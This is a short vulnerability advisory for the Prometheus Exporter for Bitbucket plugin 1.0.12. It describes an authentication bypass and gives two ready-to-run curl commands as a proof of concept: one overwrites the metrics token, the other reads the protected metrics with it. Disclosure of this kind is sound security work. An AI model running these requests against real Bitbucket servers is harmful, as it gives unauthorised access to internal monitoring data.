## Prometheus Exporter For Bitbucket 1.0.12 (v5.x-6.7.x)

There exists an authentication bypass vulnerability in this plugin. A specially crafted HTTP POST request can be sent to override the `token` value, which is used for authenticating to the metrics route. Proof of concept is below:

```
curl -X POST -d "token=TRUSTWAVE&delay=1" http://<IP>:7990/bitbucket/plugins/servlet/promforbitbucket/token/bypass
```

Once this value is overwritten, the prometheus metrics can be retrieved by submitting the following HTTP GET request:

```
curl -X GET "http://<IP>:7990/bitbucket/plugins/servlet/prometheus/metrics?token=TRUSTWAVE"
```

This POC has only been tested with the open source version of the plugin, and not the pro version in the Atlassian marketplace.
